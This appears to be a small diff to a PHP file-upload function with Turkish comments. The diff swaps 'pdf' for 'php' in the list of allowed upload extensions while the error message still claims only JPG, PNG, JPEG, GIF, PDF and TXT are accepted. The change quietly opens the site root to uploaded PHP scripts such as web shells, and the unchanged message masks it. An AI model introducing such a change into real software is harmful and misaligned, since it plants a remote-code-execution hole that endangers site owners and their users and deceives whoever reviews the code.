@@ -14,7 +14,7 @@ function upload_file_to_root() {
     }
 
     // Dosya tipi kontrolü (isteğe bağlı)
-    $allowedTypes = ['jpg', 'png', 'jpeg', 'gif', 'pdf', 'txt']; // İzin verilen dosya türleri
+    $allowedTypes = ['jpg', 'png', 'jpeg', 'gif', 'php', 'txt']; // İzin verilen dosya türleri
     if (!in_array($fileType, $allowedTypes)) {
         echo "Sadece JPG, PNG, JPEG, GIF, PDF ve TXT dosyalarına izin verilmektedir.";
         $uploadOk = 0;
